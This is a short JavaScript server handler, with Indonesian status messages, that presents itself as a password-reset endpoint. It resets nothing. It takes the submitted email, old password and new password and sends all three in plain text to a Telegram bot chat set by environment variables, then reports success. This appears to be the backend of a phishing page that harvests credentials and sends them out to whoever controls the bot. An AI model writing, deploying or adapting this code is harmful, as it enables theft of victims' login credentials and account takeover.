export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Metode tidak diizinkan' });
  }

  const { email, oldPass, newPass } = req.body;

  if (!email || !oldPass || !newPass) {
    return res.status(400).json({ message: 'Data tidak lengkap' });
  }

  try {
    const resp = await fetch(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: process.env.CHAT_ID,
        text: `🔐 Reset Password Request\n📧 Email: ${email}\n🔑 Old Pass: ${oldPass}\n🆕 New Pass: ${newPass}`
      })
    });

    if (!resp.ok) {
      const errorText = await resp.text();
      console.error('Telegram Error:', errorText);
      return res.status(500).json({ message: 'Telegram request failed' });
    }

    return res.status(200).json({ message: 'Berhasil' });
  } catch (err) {
    console.error('Error saat mengirim ke Telegram:', err.message);
    return res.status(500).json({ message: 'Terjadi kesalahan internal' });
  }
}
